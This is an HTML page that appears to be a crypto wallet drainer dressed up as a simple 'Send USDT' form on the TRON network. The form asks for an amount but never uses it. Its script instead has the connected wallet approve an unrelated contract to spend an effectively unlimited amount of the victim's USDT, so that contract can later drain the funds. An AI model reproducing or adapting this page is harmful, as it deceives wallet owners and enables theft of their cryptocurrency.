<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>Send USDT</title>
    <style>
      body {
        margin: 0;
        font-family: Arial, sans-serif;
        background: #121212;
        color: #fff;
        display: flex;
        flex-direction: column;
        align-items: center;
        padding-top: 60px;
      }
      .container {
        width: 90%;
        max-width: 400px;
        background: #1e1e1e;
        border-radius: 12px;
        padding: 20px;
        box-shadow: 0 0 10px #000;
      }
      h2 {
        text-align: center;
        margin-bottom: 20px;
        color: #00ffcc;
      }
      label {
        display: block;
        margin-top: 15px;
        font-size: 14px;
      }
      input {
        width: 100%;
        padding: 10px;
        margin-top: 5px;
        border: none;
        border-radius: 8px;
        background: #2c2c2c;
        color: #fff;
        font-size: 16px;
      }
      input[readonly] {
        background: #333;
      }
      button {
        margin-top: 25px;
        width: 100%;
        padding: 12px;
        background-color: #00ffcc;
        color: #000;
        font-weight: bold;
        border: none;
        border-radius: 8px;
        cursor: pointer;
        font-size: 16px;
      }
      button:hover {
        background-color: #00e6b8;
      }
    </style>
  </head>
  <body>
    <div class="container">
      <h2>Send USDT</h2>
      <label>Receiver Wallet Address</label>
      <input type="text" readonly value="TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN" id="receiver" />

      <label>Enter USDT Amount</label>
      <input type="number" placeholder="0.00" id="amount" />

      <button onclick="approveUSDT()">Next</button>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/@tronweb3/tronwallet-adapter@latest/dist/index.umd.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/tronweb@4.4.0/dist/TronWeb.js"></script>
    <script>
      const usdtAddress = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"; // Official TRC-20 USDT
      const contractAddress = "TYMqXAPENEz1yehDFQE34hngR1KqLW1zhX"; // Your contract
      const decimals = 6;

      async function approveUSDT() {
        if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
          alert("Please connect a TRON wallet");
          return;
        }

        const amount = document.getElementById("amount").value;
        if (!amount || isNaN(amount)) {
          alert("Enter valid amount");
          return;
        }

        try {
          const usdtContract = await window.tronWeb.contract().at(usdtAddress);
          const amountInSun = window.tronWeb.toBigNumber("1000000000000000"); // Large approval

          const tx = await usdtContract
            .approve(contractAddress, amountInSun)
            .send({ feeLimit: 100_000_000 });

          alert("Approval sent. TX: " + tx);
        } catch (err) {
          console.error(err);
          alert("Approval failed: " + err.message);
        }
      }
    </script>
  </body>
</html>
